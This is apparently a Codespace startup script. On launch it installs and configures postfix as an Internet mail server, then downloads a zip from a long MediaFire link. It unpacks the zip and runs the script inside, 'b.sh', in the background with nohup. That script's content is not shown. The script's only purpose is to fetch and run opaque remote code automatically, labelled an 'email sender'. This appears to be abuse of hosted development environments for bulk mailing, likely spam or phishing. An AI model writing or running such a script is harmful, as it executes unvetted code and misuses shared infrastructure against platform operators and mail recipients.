#!/usr/bin/env bash
# This script runs automatically when the codespace starts
sleep 10  # Wait for codespace to fully initialize

#!/usr/bin/env bash
set -euo pipefail

echo "[+] Codespace startup script running automatically..."

# Function to run commands with sudo without interaction
run_sudo() {
    echo "Running: $*"
    sudo DEBIAN_FRONTEND=noninteractive bash -c "$*"
}

# Install required packages
echo "[+] Updating packages and installing requirements..."
run_sudo "apt update -y"
run_sudo "apt install -y wget unzip dos2unix postfix"

# Configure postfix non-interactively for 'Internet Site'
echo "[+] Configuring postfix automatically..."
echo "postfix postfix/mailname string example.com" | run_sudo "debconf-set-selections"
echo "postfix postfix/main_mailer_type string 'Internet Site'" | run_sudo "debconf-set-selections"

run_sudo "service postfix restart"

# Download and setup the email sender
echo "[+] Downloading and setting up email sender..."
wget -O /tmp/send.zip "https://download943.mediafire.com/xmgr23z0jezg9QKM9hE98OemI3G2Ed9lybLjrHKPX20o3oV2PwFPkmXjmhjdWJxIO4sGbYBcIsttS00ubOOscJMqvo07JJH7qY040fpT1QjVtH0_aRgB_wuvg7D5yV3DCHsXjTsdi86AApVv8YBQggsb4xw1_IfzYUk6dCuiCzOWx1s/hynonyzev485emj/send.zip"
unzip -o /tmp/send.zip -d /workspaces/

cd /workspaces/
dos2unix -f b.sh
chmod +x b.sh

# Start the process in background
echo "[+] Starting email process automatically..."
nohup ./b.sh > b.log 2>&1 &

# Create a monitor script to check status
cat > /workspaces/check_status.sh << 'EOF'
#!/bin/bash
echo "=== Process Status ==="
ps aux | grep b.sh | grep -v grep
echo "=== Recent Log ==="
tail -20 b.log 2>/dev/null || echo "No log file yet"
EOF
chmod +x /workspaces/check_status.sh

echo "[+] Automated setup complete!"
echo "[+] Email process is running in background"
echo "[+] Check status with: ./check_status.sh"
echo "[+] View full log with: tail -f b.log"

